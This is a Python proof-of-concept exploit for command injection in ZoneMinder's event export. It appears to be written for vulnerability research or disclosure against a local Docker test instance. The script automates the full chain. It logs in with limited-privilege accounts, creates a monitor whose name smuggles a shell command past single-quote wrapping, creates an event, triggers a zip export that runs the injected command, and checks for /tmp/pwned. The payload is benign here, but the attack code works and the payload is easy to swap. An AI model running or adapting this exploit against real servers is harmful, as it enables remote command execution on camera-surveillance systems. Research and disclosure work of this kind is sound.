#!/usr/bin/env python3
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "requests>=2.34.2",
# ]
# ///
"""
ZoneMinder PoC — Command injection via monitor name in event export.

Vulnerability: download_functions.php uses manual single-quote wrapping
instead of escapeshellarg() when building tar/zip/ffmpeg commands from
$monitor->Name(). A specially worded monitor name breaks out of the quoting.

Affected lines: download_functions.php:126 (ffmpeg) and :150 (tar/zip).
and a few more in the generateFileList() function that is called for each event export.

Requirements: an account with Monitor=Create OR Monitor=Edit
"""

import sys
import argparse
import requests
import subprocess 

ZM_URL = "http://localhost:8082"
ZM_ADMIN_USER = "admin"
ZM_ADMIN_PASS = "admin"
ZM_MEDPRIV_USER = "medpriv"
ZM_MEDPRIV_PASS = "medpriv"
ZM_LOWPRIV_USER = "lowpriv"
ZM_LOWPRIV_PASS = "lowpriv"


# Command to inject inside the monitor name
COMMAND_TO_INJECT = "touch /tmp/pwned"
FAKE_MONITOR_NAME = f"poc'; {COMMAND_TO_INJECT}; echo '"


def login(session, user=ZM_ADMIN_USER, password=ZM_ADMIN_PASS):
    resp = session.post(
        f"{ZM_URL}/index.php",
        data={
            "action": "login",
            "username": user,
            "password": password,
        },
    )
    print(f"Login: {resp.status_code}")


def get_token(session, user=ZM_ADMIN_USER, password=ZM_ADMIN_PASS):
    resp = session.post(
        f"{ZM_URL}/api/host/login.json",
        data={
            "user": user,
            "pass": password,
        },
    )
    data = resp.json()
    token = data.get("access_token", "")
    print(f"Token: {'ok' if token else 'none (auth is probably off)'}")
    return token


def create_monitor(session, token):
    params = {"token": token} if token else {}
    resp = session.post(
        f"{ZM_URL}/api/monitors.json",
        params=params,
        data={
            "Monitor[Name]": FAKE_MONITOR_NAME,
            "Monitor[Type]": "Ffmpeg",
            "Monitor[Function]": "Monitor",
            "Monitor[Enabled]": 1,
            "Monitor[Width]": 640,
            "Monitor[Height]": 480,
            "Monitor[Colours]": 4,
        },
    )
    # this returns {"message":"Saved"} so there's no ID in response, which means we have to ask nicely to get the monitor ID
    print(f"Create monitor: {resp.status_code} — {resp.text[:300]}")
    monitors = session.get(f"{ZM_URL}/api/monitors.json", params=params).json()
    mid = next(
        m["Monitor"]["Id"]
        for m in monitors["monitors"]
        if m["Monitor"]["Name"] == FAKE_MONITOR_NAME
    )
    print(f"Created monitor ID={mid} name={FAKE_MONITOR_NAME!r}")
    return mid


def create_event(session, token, monitor_id):
    from datetime import datetime, timedelta

    start = datetime.now()
    end = start + timedelta(seconds=3)

    params = {"token": token} if token else {}
    # zm uses CakePHP which uses Event[Field] array notation
    resp = session.post(
        f"{ZM_URL}/api/events.json",
        params=params,
        data={
            "Event[MonitorId]": monitor_id,
            "Event[Name]": "poc-event",
            "Event[Cause]": "poc",
            "Event[StateId]": 1,  # required NOT NULL, no default
            "Event[StartDateTime]": start.strftime("%Y-%m-%d %H:%M:%S"),
            "Event[EndDateTime]": end.strftime("%Y-%m-%d %H:%M:%S"),
            "Event[Frames]": 1,
            "Event[Width]": 640,
            "Event[Height]": 480,
            "Event[DefaultVideo]": "dummy.mp4",  # prevents GenerateVideo() call which divides by Length=0 -> error don't ask, i didn't
        },
    )
    print(f"Create event: {resp.status_code}")

    params["MonitorId"] = monitor_id
    events = session.get(f"{ZM_URL}/api/events.json", params=params).json()
    if not events.get("events"):
        print("No events found for monitor that is weird, something went wrong")
        return None
    eid = events["events"][0]["Event"]["Id"]
    print(f"Event ID={eid}")
    return eid


def trigger_export(session, event_id):
    resp = session.get(
        f"{ZM_URL}/index.php",
        params={
            "request": "event",
            "action": "download",
            "eids[]": event_id,
            "exportFormat": "zip",
            "exportVideo": 1,
            "mergeevents": 1,
        },
    )
    print(f"Export: {resp.status_code} = {resp.text[:300]}")


def cleanup(session, token, monitor_id, event_id):
    params = {"token": token} if token else {}
    if event_id:
        session.delete(f"{ZM_URL}/api/events/{event_id}.json", params=params)
        print(f"Deleted event {event_id}")
    if monitor_id:
        session.delete(f"{ZM_URL}/api/monitors/{monitor_id}.json", params=params)
        print(f"Deleted monitor {monitor_id}")

def check_result():
    print("\nDid it work?")
    print("running docker exec ... ls -la /tmp/pwned inside the container to check if the file was created")
    result = subprocess.run(["docker", "exec", "docker-zoneminder-1", "ls", "-la", "/tmp/pwned"],capture_output=True, text=True, check=True)
    result_text = result.stdout.strip()
    if "pwned" in result_text:
        print("Success! Command injection worked, /tmp/pwned was created inside the container.")
        print(result_text)
    else:
        print("Nope, /tmp/pwned not found. Command injection may have failed.")



def main():

    s = requests.Session()
    login(s,ZM_MEDPRIV_USER,ZM_MEDPRIV_PASS)
    token = get_token(s,ZM_MEDPRIV_USER,ZM_MEDPRIV_PASS)

    monitor_id = create_monitor(s, token)
    event_id = create_event(s, token, monitor_id)

    if not event_id:
        print("Whoops, something went wrong")
        sys.exit(1)
    login(s,ZM_LOWPRIV_USER,ZM_LOWPRIV_PASS)
    token = get_token(s,ZM_LOWPRIV_USER,ZM_LOWPRIV_PASS)
    trigger_export(s, event_id)
    cleanup(s, token, monitor_id, event_id)
    check_result()
    

if __name__ == "__main__":
    main()
